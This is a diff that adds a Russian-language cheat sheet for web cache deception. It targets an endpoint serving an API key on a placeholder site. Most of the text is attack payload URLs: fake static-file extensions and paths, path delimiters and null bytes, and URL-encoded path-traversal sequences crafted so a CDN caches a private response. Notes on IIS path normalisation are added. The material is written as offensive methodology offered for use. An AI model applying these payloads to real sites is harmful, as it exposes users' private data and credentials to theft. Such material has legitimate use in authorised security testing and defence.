@@ -1,0 +1,55 @@
+Эндпоинт:
+https://site.org/myapikey
+
+
+####### Простые методы эксплуатации
+1. Пробуем добавить расширения
+myapikey.png
+myapikey.js
+myapikey.ico
+   ...
+   
+Смотрим, возможно ли кэширование или нет
+
+2. Подобная техника но с файлом
+myapikey/x.css
+myapikey/x.js
+myapikey/x.jpeg
+    ...
+	
+3. Пробуем разделители (весь список https://pastebin.com/raw/GvwjpeuR)
+Разделители в URL это такие символы, после каких бэк эндом путь игнорируеться, а фронт эндом нет
+Если site.com/index;products то обработаеться site.com/index, ;products игнорируеться
+
+myapikey;x.css
+myapikey%00x.js (возьмите во внимание, что большинство современных CDN не поддерживают 0вой байт)
+myapikey/x#jpeg
+     ...
+	 
+Однако современные кэш движки сложно обмануть чем-то подобным. Нужно быть более креативным чтобы добиться успеха
+
+####### Продвинутые методы эксплуатации
+
+1. Без разделителей
+[NOTE] по пути https://site.org/content все кэшируеться, даже файлы какие не сущевствуют
+https://site.org/content/../myapikey - Cached
+https://site.org/content%2F..%2Fmyapikey - Cached
+https://site.org/content%2f%2e%2e%2fmyapikey - Cached
+Играйте с /../  как можно больше, чтобы обмануть фронт энд
+Кстати, в IIS символ \ заменяеться на / автоматом :) Возьмите во внимание
+
+2. С разделителями
+[NOTE] по пути https://site.org/content все кэшируеться, даже файлы какие не сущевствуют
+https://site.org;myapikey/../content - Cached
+https://site.org%3bmyapikey/../content - Cacjed (%3b - url encoded ;)
+Так же играйте с /../ как и в прошлом примере. И не только как в прошлом примере
+
+3. Кэшируються только файлы
+[NOTE] По пути https://site.org/content не все кэшируеться, только определенные файлы
+https://site.org/content/1.jpg - 200 OK, cached
+https://site.org/content/666.jpg - 404, not cached
+
+Исходя из этого, делаем как и в прошлых примерах, но не с директорией а с файлом
+https://site.org/content/1.jpg/../myapikey
+https://site.org;myapikey/../content/1.jpg
+Так же играйте с /../ как и в прошлых примерах. И не только как в прошлых примерах
